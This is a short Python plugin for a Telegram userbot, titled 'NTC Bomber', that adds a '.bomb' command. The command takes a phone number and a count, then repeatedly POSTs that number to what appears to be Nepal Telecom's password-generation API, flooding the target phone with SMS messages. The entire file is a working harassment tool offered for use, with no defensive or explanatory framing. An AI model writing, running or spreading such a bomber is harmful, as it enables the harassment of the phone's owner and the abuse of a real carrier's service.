"""NTC Bomber custom plugin by @spider_encrypted
Format .bomb [phone number] [times]"""
import asyncio
import requests
from uniborgt.util import admin_cmd
@borg.on(admin_cmd("bomb (.*)"))
async def _(event):
    num=0
    n=0
    input_str = event.pattern_match.group(1)
    if input_str:
        num = int(input_str[:10])
        n = int(input_str[11:])
    else:
        await event.edit("Enter a number!")
        return
    paramss={"phone":num}
    await event.edit("`Bombing....`")
    for i in range (n):
        requests.post("https://cms.ntc.net.np/api/generateAuthPassword",params=paramss)
        await event.edit(f"`Bombing.... {i}`")
    await event.edit(f"`Bombed {n} SMS to {num}`")

    
